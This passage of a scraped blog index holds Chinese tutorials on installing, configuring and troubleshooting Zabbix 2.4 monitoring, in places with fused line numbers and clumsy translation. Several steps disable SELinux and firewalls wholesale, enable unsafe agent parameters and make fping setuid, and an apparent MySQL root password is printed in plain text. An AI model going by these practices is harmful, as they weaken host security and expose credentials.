123456789101112131415161718192021222324252627282930313233343536373839404142434445名称：Action-Email默认接收人：故障&#123;TRIGGER.STATUS&#125;,服务器:&#123;HOSTNAME1&#125;发生: &#123;TRIGGER.NAME&#125;故障!默认信息：告警主机:&#123;HOSTNAME1&#125;告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;告警等级:&#123;TRIGGER.SEVERITY&#125;告警信息: &#123;TRIGGER.NAME&#125;告警项目:&#123;TRIGGER.KEY1&#125;问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;事件ID:&#123;EVENT.ID&#125;恢复信息：打钩恢复主旨：恢复&#123;TRIGGER.STATUS&#125;, 服务器:&#123;HOSTNAME1&#125;: &#123;TRIGGER.NAME&#125;已恢复!恢复信息：告警主机:&#123;HOSTNAME1&#125;告警时间:&#123;EVENT.DATE&#125; &#123;EVENT.TIME&#125;告警等级:&#123;TRIGGER.SEVERITY&#125;告警信息: &#123;TRIGGER.NAME&#125;告警项目:&#123;TRIGGER.KEY1&#125;问题详情:&#123;ITEM.NAME&#125;:&#123;ITEM.VALUE&#125;当前状态:&#123;TRIGGER.STATUS&#125;:&#123;ITEM.VALUE1&#125;事件ID:&#123;EVENT.ID&#125;已启用：打钩 创建Operations 到这里就基本配置完毕了。 测试下关闭agent 1分钟左右可以收到邮件。 关闭防火墙和selinux 即可，不关闭防火墙开启10051端口和10050端口 测试查看zabbix审计动态日志：发送成功 邮件已接收成功。 微信告警也已写详细文档。文档file已上传github上面了。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix性能监控故障总结","slug":"性能监控/Zabbix/zabbix-故障总结","date":"2014-10-04T10:30:33.000Z","updated":"2017-03-21T09:22:34.000Z","comments":true,"path":"2014/10/04/性能监控/Zabbix/zabbix-故障总结/","link":"","permalink":"http://blog.yangcvo.me/2014/10/04/性能监控/Zabbix/zabbix-故障总结/","excerpt":"","text":"1.zabbix红色弹出报错 zabbix server is not running: the information displayed may not be current 排错: 123456789101112131415161718192021222324251. 检查 /var/www/html/zabbix/conf/zabbix.conf.php 确定 $DB['DATABASE'] 数据库$DB['USER'] 用户$DB['PASSWORD'] 密码这三个参数都是正确的。 注意：每次改了参数文件一定要记得重启zabbix_server这里都没问题。2. 关闭SELinux的方法:修改/etc/selinux/config文件中的SELINUX=\"\" 为 disabled ，然后重启。如果不想重启系统，使用命令setenforce 0注:setenforce 1 设置SELinux 成为enforcing模式setenforce 0 设置SELinux 成为permissive模式 在lilo或者grub的启动参数中增加：selinux=0,也可以关闭selinuxselinux是否关闭。一定要关闭这个，开启selinux会引起一连串问题，甚至zabbix的discovery功能也不能正常使用3. 上面都没有问题然后在查看服务是否正常启动。查看/tmp/zabbix_server.log和/tmp/zabbix_agent.log无任何异常。如果日志提示查找不到主机名，我们看下服务是否启动。4. 看zabbix_server和zabbix_agent进程、端口都正常 netstat -ntulp如果没有启动 需要手动启动下，这里可能服务没有启动，启动服务即可。 2.安装好zabbix-agentd 监控端报错Get value from agent failed: cannot connect to [[192.168.1.218]:10050]: [113] No route to host 排错: 123456789看提示“No route to host”，与网络连接有关。排除的方法如下:a）查看192.168.30.3这台机器是否已开机b)在zabbix server端向这台机器ping，看网络是否通c）用telnet 登录10050和10051端口，看该主机是否允许这两个端口通讯d)查看iptables防火墙规则是否拦截10050、10051端口 3.时间不同步Check if client local time is in sync with Zabbix server time123456789101112131415因为我在我的网络中的一些NTP服务器，这将是很好能够测量主机和这些服务器之一之间的时间差。可悲的是，这几乎是不可能的。但有一个解决方案:`system.localtime.fuzzytime`，照顾这只是一个!!!触发的“fuzzytime”功能发出警报，如果被监控服务器的时间漂移。它比较报告主机的时间的zabbix服务器在触发器被处理的时间上的时间。fuzzytime（秒），可能是（浮点，整数）:返回1，如果时间戳（项目值）不从的zabbix服务器时间有所不同超过N秒，0 -否则通常用于system.localtime检查本地时间在服务器的zabbix本地时间同步。注:添加公式时，使用“添加”按钮，在右侧，这是很简单的这种方式！系统时间跟我现在北京时间不同步。date -R 查看下需要手动添加计划任务同步下，设置开机启动。这里IP是zabbix-server IP00 * * * * /usr/sbin/ntpdate 192.168.47.20 &gt;/dev/null 2&gt;&amp;1 还有不懂得可以看:参考 4.MySQL内存不够 Lack of available memory on server MySQL故障原因:Lack of available memory on server argus047072 123需要添加内存故障原因:Redis链接数超过最大客户端数量限制。是否有大量的进程在后台运行 5.Received empty response from Zabbix Agent问题解决123456789出现如下错误:Received empty response from Zabbix Agent at [192.168.1.2]. Assuming that agent dropped connection because of access permission大概意思是说没有权限访问agent端口10050，解决方法如下:# cat zabbix_agentd.conf| grep Server=Server=192.168.1.2 # zabbix server ip地址如果你的server有多个IP地址，使用逗号分隔多个IP地址。 6.zabbix 报错磁盘不足Free disk space is less than 20% on volume /home123456789101112131415161718192021222324磁盘总共大小du -Th定位查看是什么消耗那么多磁盘空间，查看home目录。du -s -h /srv/tomcat/tomcat_account/logs/* | sort1G localhost.2015-12-21.log2G localhost.2015-12-22.log2G localhost.2015-12-23.log.....find /srv/tomcat/tomcat_account/logs/ -mtime +1 -name \"*.log\" -exec rm -rf &#123;&#125; \\;这个保留前一天的日志其余都删除。1. 计划任务脚本清除前一天00 00 * * * find /home/admin/output/ -mtime +1 -exec rm &#123;&#125; \\;2. 或者使用脚本放到计划任务里面跑1 0 * * * /opt/soft/log/qingli-log.sh &gt;/dev/null 2&gt;&amp;1这里的设置是每天凌晨0点1分执行qingli-log.sh .sh文件进行数据清理任务了。在查看磁盘总共大小 7.zabbix监控报错zabbix server is not running: the information displayed may not be current的解决1234567故障原因:Zabbix agent on labs047093 is unreachable for 5 minutesZabbix使用一段时间后总是报Zabbix Agent不可到达解决结果:这三台机器网络不通，ssh连接不上，排错方法查看日志是否有报错，是否服务没有起来。如果数据库服务器是一直正常的，SELinux是事先关闭没有，修改完上述所提到的后发现问题依然。Zabbix依然报错（Zabbix Server Messages: PROBLEM: Zabbix agent on Zabbix server is unreachable for 5 minutes。查看日志报什么错，定位解决问题，一般出现这个大部分数据延迟导致，在图形上面明显看到有4到5分钟数据是空白的。 8.zabbix图形出现乱码或者没有文字。参考文档:zabbix2.4图形乱码 9.Zabbix监控之邮件告警发送失败smtp-server: 错误代码550与535参考文档:zabbix163邮件告警错误代码 10.zabbix中提示：Lack of free swap space on hostname12345678910111213141516171819202122232425262728293031323334提示：缺交换空间可以创建也可以不用创建。[root@xx ~]# free -m total used free shared buffers cachedMem: 3832 3488 343 0 267 2389-/+ buffers/cache: 831 3000swap: 0 0 0个般物理机不可能不设交换分区，显然这样的设计没有考虑到云主机用户。只需要调节监控文件，即可解决问题：解决此问题的步骤如下:选择 Configuration-&gt;Templates(模板),在模板界面中选择Template OS Linux右侧的Triggers（触发器）,在触发器页面中打开Lack of free swap space on &#123;HOST.NAME&#125;项目,在新打开的触发器编辑页面中修改Expression（表达式）的内容,由原先的&#123;Template OS Linux:system.swap.size[,pfree].last(0)&#125;&lt;50修改为&#123;Template OS Linux:system.swap.size[,pfree].last(0)&#125;&lt;50 and &#123;Template OS Linux:system.swap.size[,free].last(0)&#125;&lt;&gt;0 此处修改增加了“and&#123;Template OS Linux:system.swap.size[,free].last(0)&#125;&lt;&gt;0”判断系统有交换空间，当系统无交换空间&#123;Template OSLinux:system.swap.size[,free].last(0)&#125;的值为0时将不会使表达式成立，也就不会触发错误提示。保存后在下一个更新周期内zabbix之前报告“Lack of free swap space”问题就会被自动标记为Resolved.或者创建：1、首先看一下内存free -m2、然后创建一个分区添加交换文件mkdir /etc/swap/dd if=/dev/zero of=/etc/swap/swap bs=1024 count=1024000 1个G3、创建交换空间mkswap /etc/swap/swap4、启动交换空间swapon /etc/swap/swap5、查看新增空间free -tom6、修改/etc/fstab文件使系统在重新启动的时候生效/etc/swap/swap swap swap defaults 0 0 11.cannot send list of active checks to [192.168.0.1]: host [Zabbix server] not found123456查看被监控机上的/tmp/zabbix_agentd.log，显示日志：No active checks on server: host [Zabbix server] not found这是因为，通过zabbix dashboard页面配置的被监控主机名跟被监控主机上zabbix_agentd.conf中配置的Hostname不一致。修改为一致的名字后，重启zabbix_agentd即可。 12.解决CentOS 7安装zabbix 3.0 无法启动zabbix-server的问题123[root@kvm zabbix_agentd.d]# service zabbix-agent restartRedirecting to /bin/systemctl restart zabbix-agent.serviceJob for zabbix-agent.service failed because a configured resource limit was exceeded. See \"systemctl status zabbix-agent.service\" and \"journalctl -xe\" for details. 解决方案 ：关闭SELinux服务 。 执行命令 1234setenforce 0 3. 重启zabbixsystemctl restart zabbix-server.service zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix邮件告警 : zabbix邮件告警 zabbix3.0部署jmx监控tomcat: zabbix3.0部署jmx监控tomcat","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix2.4服务端rpm快速安装部署","slug":"性能监控/Zabbix/zabbix2.4服务端yum-rpm快速安装部署","date":"2014-10-03T07:02:07.000Z","updated":"2016-08-03T07:48:40.000Z","comments":true,"path":"2014/10/03/性能监控/Zabbix/zabbix2.4服务端yum-rpm快速安装部署/","link":"","permalink":"http://blog.yangcvo.me/2014/10/03/性能监控/Zabbix/zabbix2.4服务端yum-rpm快速安装部署/","excerpt":"","text":"系统环境： 192.168.1.170 MySQL主 192.168.1.183 zabbix-server Zabbix 快速部署（RPM）注释：安装环境为系统最小安装，注意时间同步 12[root@docker ~]# cat /etc/redhat-releaseCentOS Linux release 7.2.1511 (Core) 关闭SELinux：1、临时关闭（不用重启机器）： #setenforce 0 ##设置SELinux 成为permissive模式 #setenforce 1 ##设置SELinux 成为enforcing模式 1.配置官方yum： cnetos 32位：#rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/6/i386/zabbix-release-2.4-1.el6.noarch.rpm cnetos 64位：#rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-release-2.4-1.el6.noarch.rpm centos7 64位：# rpm -ivh http://repo.zabbix.com/zabbix/2.4/rhel/7/x86_64/zabbix-release-2.4-1.el7.noarch.rpm 如果选择这个方式是安装最高的2.4.8版本 2.安装Zabbix：12#yum -y install zabbix-server-mysql zabbix-web-mysql zabbix-agent mysql-server mysql #安装相关软件包#yum -y install zabbix-get zabbix-sender #方便以后对zabbix调试用 3.配置数据库 登陆到192.168.1.170服务器上面： 12# mysql -e \"create database zabbix character set utf8 collate utf8_bin;\" #修改时区# mysql -e \"grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\" #创建数据库名 这里我设置了只能192.168.1.0网段可以访问数据库。 所以这里创建数据库直接这么操作了。 1234567891011121314151617181920 [root@mysql ~]# mysql -uroot -pIhaozhuo_b313 -h 192.168.1.170Warning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 10Server version: 5.6.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; create database zabbix character set utf8 collate utf8_bin;Query OK, 1 row affected (0.06 sec)mysql&gt; GRANT ALL ON zabbix.* TO 'zabbix'@'192.168.1.%' IDENTIFIED BY 'zabbix123.com';Query OK, 0 rows affected (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 4.导入数据库文件： 1cd /usr/share/doc/zabbix-server-mysql-2.4.8/create 操作三条命令把数据导入到在指定的MySQL：zabbix 123mysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; schema.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; images.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; data.sql 4. 修改zabbix_server.conf 文件vim /etc/zabbix/zabbix_server.conf 1234567# ListenPort=10051 //监听的端口# LogFile=/var/log/zabbix/zabbix_server.log //日志文件路径# LogFileSize=0 //日志文件滚动，分割。（参数为“0”，不做滚动），例如当日志文件到达1G，会自动创建个新的日志文件，完成日志滚动。DBName=zabbix DBUser=zabbix #数据库用户名DBPassword=zabbix123.com #数据库密码AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts#zabbix运行脚本存放目录 :wq! #保存退出 12345678910111213#cp /etc/zabbix/zabbix_server.conf &#123;,.bak&#125; #备份ln -s /etc/alternatives/zabbix-server /usr/bin/zabbix-servercp /usr/sbin/zabbix_agentd /etc/init.d/zabbix_agentd[root@docker alternatives]# cp /etc/alternatives/zabbix_server /etc/init.d/zabbix-serverchmod +x /etc/rc.d/init.d/zabbix_server #添加脚本执行权限chmod +x /etc/rc.d/init.d/zabbix_agentd #添加脚本执行权限vim /etc/php.inidate.timezone = Asia/Shanghaipost_max_size = 32Mmax_execution_time = 300max_input_time = 300 5. 修改zabbix开机启动脚本中的zabbix安装目录123456vi /etc/rc.d/init.d/zabbix_server #编辑服务端配置文件BASEDIR=/usr/local/zabbix/ #zabbix安装目录# /etc/init.d/zabbix-server start# /etc/init.d/zabbix_agentd start#/etc/init.d/httpd start 6.1 添加开机启动服务1234chkconfig --add zabbix-server chkconfig --add zabbix-agent chkconfig --add httpd chkconfig --add mysqld 6.2 添加开机启动1234chkconfig zabbix-server on chkconfig zabbix-agent on chkconfig httpd on chkconfig mysqld on 6.3 添加防火墙123-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 10051 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 10050 -j ACCEPT 7.在浏览器中打开：http://192.168.1.183/zabbix/进入设置界面 进入： “/var/www/html/zabbix/conf/zabbix.conf.php” 备份： cp zabbix.conf.php.example zabbix.conf.php下载下来的放到这个目录下面。 用户名:Admin 密码：zabbix 设置中文版本，2.4版本以后都支撑中文版本，2.2.0版本都是不支持的，需要下载中文版本包，放到zabbix目录下面。 设置背景为经典的是不是看着会舒服点：3.0 对外观改的改动很大，支撑硬件监控功能加强。 简单的安装就已经搞定了。 安装出现几种错误情况：登陆zabbix提示zabbix server is not running:the information displayedmay not be current 解决方法： 12关闭selinux与iptablesvim /var/www/html/zabbix/conf/zabbix.conf.php将zabbix.conf.php里的server写成ip地址，就解决了 查看日志： 126576:20160719:045354.989 [Z3001] connection to database 'zabbix' failed: [2002] Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2) 这个报错的话，就说明配置文件有问题： 设置数据库访问地址：DBHost=192.168.1.170 然后vi zabbix.conf.php记得修改： 123$ZBX_SERVER = 'ZABBIX_SERVER_IP'; IP地址$ZBX_SERVER_PORT = '10051'; 然后重启下服务，就不会出现MySQL本地无法连接。 如果报错： 16664:20160719:050257.665 cannot send list of active checks to [127.0.0.1]: host [Zabbix server] not monitored 确保zabbix前台上的Host name与主机的hostname一致即可。 这是快速简单安装2.4.8版本的，后面还有编译安装的，编译安装的好处，可以了解安装的路径和配置文件都是自己熟悉的。 2.4.8服务端编译安装与部署： 2.4.8升级3.0安装与部署： 3.0安装与部署： 安装完成以后出现图像乱码： https://github.com/yangcvo/zabbix.2.4 2.4.8版本zabbix-server服务端编译安装：源码编译安装部署2.4.8版本zabbix-server服务端","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"Zabbix2.4server服务端编译安装","slug":"性能监控/Zabbix/Zabbix2.4server服务端编译安装","date":"2014-10-02T13:42:24.000Z","updated":"2017-03-14T06:01:42.000Z","comments":true,"path":"2014/10/02/性能监控/Zabbix/Zabbix2.4server服务端编译安装/","link":"","permalink":"http://blog.yangcvo.me/2014/10/02/性能监控/Zabbix/Zabbix2.4server服务端编译安装/","excerpt":"","text":"系统环境： 192.168.1.170 MySQL主 192.168.1.183 zabbix-server CentOS Linux release 7.2.1511 (Core) zabbix源码下载 : http://www.zabbix.com/download.php 依赖下载：https : //github.com/zabbixcn/curl-rpm/tree/master/RPMS 第一步zabbix：关闭本机上的selinux与iptables服务 1、关闭SELinux 123456#下面的命令实现永久关闭SELinux sed -i 's/^SELINUX=.*/#&amp;/;s/^SELINUXTYPE=.*/#&amp;/;/SELINUX=.*/a SELINUX=disabled' /etc/sysconfig/selinux#下面的命令实现临时关闭SELinux/usr/sbin/setenforce 0/usr/sbin/setenforce: SELinux is disabled 也可以设置开放端口出去。 CentOS 7.0默认使用的是firewall作为防火墙，这里改为iptables防火墙。 firewall： 123systemctl start firewalld.service#启动firewallsystemctl stop firewalld.service#停止firewallsystemctl disable firewalld.service#禁止firewall开机启动 CentOS7默认的防火墙不是iptables,而是firewalle.centos 7 的默认没有安装iptables 需要安装： 123yum install iptables-services#保存上述规则 service iptables save 等会再添加端口：10050 ，10051 搭建LAMP环境，或LNMP环境 1yum install mysql-server httpd php –y 安装其它依赖包 1yum install mysql-devel gcc net-snmp-devel curl-devel perl-DBI php-gd php-mysql php-bcmath php-mbstring php-xml –y gcc OpenIPMI-devel net-snmp-devel.x86_64 libxml2-devel mysql-devel 增加zabbix用户和组 12groupadd zabbixuseradd –g zabbix –m zabbix 二、zabbix软件包下载下载： http://jaist.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/2.4.8/ 12345curl -O http://jaist.dl.sourceforge.net/project/zabbix/ZABBIX%20Latest%20Stable/2.4.8/zabbix-2.4.8.tar.gz解压安装包tar -zxvf zabbix-2.4.8.tar.gz./configure --prefix=/usr/local/zabbix --with-mysql --with-net-snmp --with-libcurl --enable-server --enable-agent --enable-proxy#make &amp;&amp; make install 3.配置数据库 登陆到192.168.1.170服务器上面： 12# mysql -e \"create database zabbix character set utf8 collate utf8_bin;\" #修改时区# mysql -e \"grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';\" #创建数据库名 这里我设置了只能192.168.1.0网段可以访问数据库。 所以这里创建数据库直接这么操作了。 1234567891011121314151617181920[root@mysql ~]# mysql -uroot -pIhaozhuo_b313 -h 192.168.1.170Warning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 10Server version: 5.6.20-log MySQL Community Server (GPL)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; create database zabbix character set utf8 collate utf8_bin;Query OK, 1 row affected (0.06 sec)mysql&gt; GRANT ALL ON zabbix.* TO 'zabbix'@'192.168.1.%' IDENTIFIED BY 'zabbix123.com';Query OK, 0 rows affected (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 四.导入数据库文件：1cd /usr/share/doc/zabbix-server-mysql-2.4.8/create 操作三条命令把数据导入到在指定的MySQL：zabbix 123mysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; schema.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; images.sqlmysql -uzabbix -pzabbix123.com -h 192.168.1.170 zabbix &lt; data.sql 五、配置文件及web前端文件修改添加服务端口 vi /etc/services #编辑，在最后添加以下代码 123456# Zabbixzabbix-agent 10050/tcp # Zabbix Agentzabbix-agent 10050/udp # Zabbix Agentzabbix-trapper 10051/tcp # Zabbix Trapperzabbix-trapper 10051/udp # Zabbix Trapper:wq! #保存退出 添加后如下 12345# grep zabbix /etc/serviceszabbix-agent 10050/tcp #ZabbixAgentzabbix-agent 10050/udp #ZabbixAgentzabbix-trapper 10051/tcp #ZabbixTrapperzabbix-trapper 10051/udp #ZabbixTrapper 修改zabbix配置文件 vim /usr/local/zabbix/etc/zabbix_server.conf 12345DBName=zabbix #数据库名称DBUser=zabbix #数据库用户名DBPassword=zabbix123.com #数据库密码ListenIP=192.168.1.170 #数据库ip地址AlertScriptsPath=/usr/local/zabbix/share/zabbix/alertscripts #zabbix运行脚本存放目录 :wq! #保存退出 1234vi /usr/local/zabbix/etc/zabbix_agentd.confInclude=/usr/local/zabbix/etc/zabbix_agentd.conf.d/UnsafeUserParameters=1 #启用自定义key:wq! #保存退出 六、添加开机启动脚本123456cp /tmp/zabbix-2.4.8/misc/init.d/fedora/core/zabbix_server /etc/rc.d/init.d/zabbix_server #服务端cp /tmp/zabbix-2.4.8/misc/init.d/fedora/core/zabbix_agentd /etc/rc.d/init.d/zabbix_agentd #客户端chmod +x /etc/rc.d/init.d/zabbix_server #添加脚本执行权限chmod +x /etc/rc.d/init.d/zabbix_agentd #添加脚本执行权限chkconfig zabbix_server on #添加开机启动chkconfig zabbix_agentd on #添加开机启动 七、修改zabbix开机启动脚本中的zabbix安装目录vi /etc/rc.d/init.d/zabbix_server #编辑服务端配置文件 12BASEDIR=/usr/local/zabbix/ #zabbix安装目录:wq! #保存退出 vi /etc/rc.d/init.d/zabbix_agentd #编辑客户端配置文件 12BASEDIR=/usr/local/zabbix/ #zabbix安装目录:wq! #保存退出 八、配置web站点1234cd zabbix-2.4.8cp -r /zabbix-2.4.8/frontends/php /var/www/html/zabbixcd /var/www/html/chown -R zabbix:zabbix zabbix service zabbix_server start #启动zabbix服务端 service zabbix_agentd start #启动zabbix客户端 九、修改php配置文件参数1、vi /etc/php.ini #编辑修改 123max_execution_time=300max_input_time=300date.timezone=Asia/Shanghai :wq! #保存退出 上面提到了防火墙开放对应的端口：防火墙： 123-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 10051 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 10050 -j ACCEPT 重启apache 1#service httpd restart 在浏览器中打开：http://192.168.1.183/zabbix/ 进入设置界面 进入： “/var/www/html/zabbix/conf/zabbix.conf.php” 备份： cp zabbix.conf.php.example zabbix.conf.php下载下来的放到这个目录下面。 用户名:Admin 密码：zabbix 设置中文版本，2.4版本以后都支撑中文版本，2.2.0版本都是不支持的，需要下载中文版本包，放到zabbix目录下面。 设置背景为经典的是不是看着会舒服点：3.0 对外观改的改动很大，支撑硬件监控功能加强。 简单的安装就已经搞定了。 安装出现几种错误情况：登陆zabbix提示zabbix server is not running:the information displayedmay not be current 解决方法： 12关闭selinux与iptablesvim /var/www/html/zabbix/conf/zabbix.conf.php将zabbix.conf.php里的server写成ip地址，就解决了 查看日志： 126576:20160719:045354.989 [Z3001] connection to database 'zabbix' failed: [2002] Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2) 这个报错的话，就说明配置文件有问题： 设置数据库访问地址：DBHost=192.168.1.170 然后vi zabbix.conf.php记得修改： 123$ZBX_SERVER = 'ZABBIX_SERVER_IP'; IP地址$ZBX_SERVER_PORT = '10051'; 然后重启下服务，就不会出现MySQL本地无法连接。 如果报错： 16664:20160719:050257.665 cannot send list of active checks to [127.0.0.1]: host [Zabbix server] not monitored 确保zabbix前台上的Host name与主机的hostname一致即可。 这是快速简单安装2.4.8版本的，后面还有编译安装的，编译安装的好处，可以了解安装的路径和配置文件都是自己熟悉的。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"Performance monitoring","slug":"Performance-monitoring","permalink":"http://blog.yangcvo.me/tags/Performance-monitoring/"},{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix出现乱码","slug":"性能监控/Zabbix/zabbix出现乱码","date":"2014-10-02T08:43:07.000Z","updated":"2016-08-03T07:49:38.000Z","comments":true,"path":"2014/10/02/性能监控/Zabbix/zabbix出现乱码/","link":"","permalink":"http://blog.yangcvo.me/2014/10/02/性能监控/Zabbix/zabbix出现乱码/","excerpt":"","text":"出现乱码： 乱码安装包下载地址：中文汉化乱码包 参考文档： zabbix版本都已有汉化功能了，直接选择中文就行。 可是低版本的就需要安装汉化，可是发现打开图形界面是空白图形： 遇到中文乱码问题。zabbix乱码是怎么照成的呢？zabbix使用DejaVuSan.ttf字体，不支持中文，导致中文出现乱码。解决方法很简单，把我们电脑里面字体文件传到zabbix服务器上。 在zabbix-server端上面进入安装目录： var/www/html/zabbix/fonts目录下面查看，发现之前上传字体的文件名后缀是.ttc，猜着一般见到的都后缀都是ttf的，会不会是这个问题导致的呢。于是在windows系统上找到simkai.ttf,上传到fonts下，编辑/var/www/html/zabbix/include/defines.inc.php，更改两处地方： define(‘ZBX_FONT_NAME‘, ‘simkai‘); define(‘ZBX_GRAPH_FONT_NAME‘, ‘simkai‘); 设置好了，服务重启下，刷新，图下面就有字体了： 常见问题：依旧乱码：通过以上的操作，大部分同学的乱码问题解决了，但是依旧有一些同学还是乱码？细心的群友提供另外一种情况：初始化数据库的时候未使用utf8编码所致.初始化数据库使用命令 create database zabbix default charset utf8; 或者my.cnf增加如下配置 default-character-set = utf8 总结 乱码处理方法很简单，实际上就是替换字体。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : zabbix监控MySQL-添加自定义监控项 zabbix的ICMP_Ping模版实现对客户端网络状态的监控 : zabbix的ICMP_Ping模版实现对客户端网络状态的监控 zabbix性能监控故障总结 zabbix性能监控故障总结","raw":null,"content":null,"categories":[{"name":"monitoring","slug":"monitoring","permalink":"http://blog.yangcvo.me/categories/monitoring/"}],"tags":[{"name":"zabbix","slug":"zabbix","permalink":"http://blog.yangcvo.me/tags/zabbix/"}]},{"title":"zabbix的ICMP_Ping模版实现对客户端网络状态的监控","slug":"性能监控/Zabbix/zabbix的ICMP-Ping模版实现对客户端网络状态的监控","date":"2014-10-01T02:04:14.000Z","updated":"2016-08-03T07:48:10.000Z","comments":true,"path":"2014/10/01/性能监控/Zabbix/zabbix的ICMP-Ping模版实现对客户端网络状态的监控/","link":"","permalink":"http://blog.yangcvo.me/2014/10/01/性能监控/Zabbix/zabbix的ICMP-Ping模版实现对客户端网络状态的监控/","excerpt":"","text":"上一次搭建了邮件告警和微信告警，可以很方便及时接收到告警的。这里讲zabbix里面ICMP-ping模板的实现网络监控。 Zabbix使用外部命令fping处理ICMP ping的请求，fping不包含在zabbix的发行版本中，需要额外去下载安装fping程序，安装完毕之后需要在zabinx_server.conf中的参数FpingLocation配置fping安装的路径。 由于fping默认是root权限工作，而zabbix-server是zabbix用户运行的，所以需要对fping程序设置setuid权限，如果在自定义key的时候需要用到netstat命令，也同样要设置setuid，否则不能获取到数据，而在日志中提示权拒绝。 一、登陆Zabbix服务器做以下操作：1.fping安装 12345wget http://www.fping.org/dist/fping-3.10.tar.gztar zxvf fping-3.10.tar.gzcd fping-3.10./configure --prefix=/usr/local/fping/make &amp;&amp; make install 2.修改zabbix_server.conf配置文件 12345vim /usr/local/zabbix/etc/zabbix_server.conf把FpingLocation路径修改为刚安装的fping路径。FpingLocation=/usr/local/fping/sbin/fping 如果不修改zabbix_server.conf配置件需要使用软连接到/usr/local/sbin/fping，zabbix默认fping的路径是/usr/sbin/fping 12ln -s /usr/sbin/fping /path/to/non-existant/fpingln -s /usr/sbin/fping6 /path/to/non-existant/fping6 3.修改fping权限（如果不设下面权限，zabbix服务端会采集不到数据） 12# chown root:zabbix /usr/local/fping/sbin/fping# chmod 4710 /usr/local/fping/sbin/fping 安装完fping，设置好zabbix-server 配置文件，需要重启服务。 1service zabbix_server restart #重启服务 4.zabbix用户测试fping命令 12/usr/local/fping/sbin/fping www.baidu.comwww.baidu.com is alive # 说明命令返回成功。 二、登陆Zabbix监控网页做以下设置打开zabbix-configuration-host-creat 1.host添加需要监控的ip地址,这里就不介绍了。 2.选择模版template icmp ping 3.添加Graphs 添加完以后可以查看对应的机器图形： 四、触发器模版已自带，设置报警方式后就可以接收报警邮件了。 zabbix-server2.4服务端编译安装 zabbix-server服务端编译安装 zabbix2.4监控80端口状态 : zabbix监控80端口状态 zabbix+Grafana安装使用监控结合 ：zabbix+Grafana安装使用监控结合 zabbix监控MySQL-添加自定义监控项 : 